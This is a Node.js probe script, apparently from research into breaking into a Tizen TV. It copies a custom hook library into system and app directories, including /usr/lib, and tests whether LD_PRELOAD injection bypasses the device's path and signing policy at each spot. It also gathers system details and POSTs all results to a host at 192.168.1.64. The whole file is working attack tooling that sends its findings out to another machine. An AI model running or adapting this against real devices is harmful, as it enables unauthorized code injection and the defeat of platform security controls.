"use strict";
var fs = require("fs");
var http = require("http");
var cp = require("child_process");

function post(path, body) {
    var data = JSON.stringify(body);
    var req = http.request({ host: "192.168.1.64", port: 9999, path: path, method: "POST",
        headers: { "Content-Type": "application/json", "Content-Length": Buffer.byteLength(data) } },
        function (res) { res.resume(); console.log("posted " + path + " " + res.statusCode); });
    req.on("error", function (e) { console.log("post err " + path + " " + e.message); });
    req.write(data);
    req.end();
}

function sh(cmd, cap) {
    try { return cp.execSync(cmd + " 2>&1", { encoding: "utf8", timeout: 15000 }).slice(0, cap || 6000); }
    catch (e) { return "ERR " + (e.stdout ? e.stdout : e.message); }
}

var out = {};
out.started = new Date().toISOString();
var MK = "/opt/usr/tee_probe_loaded";
var SDK = "/home/owner/share/tmp/sdk_tools";

function try_preload(label, so) {
    sh("rm -f " + MK);
    var r = sh("LD_PRELOAD=" + so + " /bin/sh -c 'echo ran'");
    var mk = sh("cat " + MK + " 2>&1");
    return { label: label, output: r.trim().slice(0, 200), marker: mk.trim().slice(0, 80) };
}

// path-policy matrix: same bytes, different directories
sh("cp " + SDK + "/lm_copy.so /opt/usr/lm_copy.so");
out.p1_opt_usr_signed = try_preload("signed bytes @ /opt/usr/lm_copy.so", "/opt/usr/lm_copy.so");

sh("cp " + SDK + "/tee_probe_elf.so /opt/usr/tee_probe_elf.so");
out.p2_opt_usr_ours = try_preload("our hook @ /opt/usr/tee_probe_elf.so", "/opt/usr/tee_probe_elf.so");

var ENGDIR = "/usr/apps/org.tizen.contents-recognition-service/data_big";
sh("cp " + SDK + "/tee_probe_elf.so " + ENGDIR + "/tee_probe_elf.so");
out.p3_engine_dir = try_preload("our hook @ engine data_big dir", ENGDIR + "/tee_probe_elf.so");

sh("cp " + SDK + "/tee_probe_elf.so /opt/usr/apps/org.tizen.contents-recognition-service/data_big/tee_probe_elf.so");
out.p4_engine_dir_opt = try_preload("our hook @ /opt/usr/apps/.../data_big", "/opt/usr/apps/org.tizen.contents-recognition-service/data_big/tee_probe_elf.so");

sh("cp " + SDK + "/tee_probe_elf.so /usr/lib/tee_probe_elf.so");
out.p5_usr_lib = try_preload("our hook @ /usr/lib", "/usr/lib/tee_probe_elf.so");

// engine dir reality check
out.engine_real = sh("readlink -f /usr/apps/org.tizen.contents-recognition-service/data/libOCREngine.so; ls -la /usr/apps/org.tizen.contents-recognition-service/data/libOCREngine.so " + ENGDIR + " 2>&1 | head -8");

// tv float ABI
out.tv_abi = sh("strings /lib/libc.so.6 | grep -E 'Tag_ABI_VFP_args|Tag_CPU_name' | head -4");

post("/ocr_uep2", out);
post("/ocr_uep2_done", { started: out.started });
